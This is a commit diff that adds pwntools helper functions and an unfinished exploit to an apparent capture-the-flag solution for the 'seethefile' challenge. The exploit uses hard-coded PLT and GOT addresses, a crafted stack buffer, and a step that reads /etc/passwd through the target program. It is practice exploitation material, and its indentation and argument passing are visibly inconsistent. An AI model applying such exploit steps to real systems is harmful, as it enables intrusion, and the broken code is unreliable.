20bfeffd95953933243f572db99451950f2a76bd
starbuucks <hee980410@gmail.com>
2020-07-17 16:27:05 +0900

    Make functions

--- seethefile/sol_seethefile.py
+++ seethefile/sol_seethefile.py
@@ -5,8 +5,59 @@ from pwn import *
 
 debug = True
 
+def menu(choice):
+	s.recvuntil('Your choice :')
+	s.sendline(str(choice))
+	if debug:
+		pass
+		#print('menu', choice)
+
+def openfile(filename):
+	menu(1)
+	s.recvuntil('What do you want to see :')
+	s.sendline(filename)
+	if debug:
+		print('openfile finished')
+
+def readfile():
+	menu(2)
+	if debug:
+		print('readfile finished')
+
+def writefile():
+	menu(3)
+	menuline = '---------------MENU---------------'
+	re = s.recvuntil(menuline)
+	if debug:
+		print('writefile finished')
+	return re[:-len(menuline)]
+
+def closefile():
+	menu(4)
+	if debug:
+		print('closefile finished')
+
+def etc(name, menu_choice=5):
+	menu(menu_choice)
+	s.recvuntil('Leave your name :')
+	s.sendline(name)
+	if debug:
+		print('etc finished')
+
 def exploit():
-    pass
+	atoi_plt = 0x080485D0
+	strstr_got = 0x0804B00C
+
+	stack_buf = '5\x00\x00\x00'
+	stack_buf += p32(strstr_got)
+
+	payload = ''
+
+	etc(payload, stack_buf)
+
+    openfile('/etc/passwd')
+    readfile()
+    print writefile()
 
 if debug:
     s = process('./seethefile')
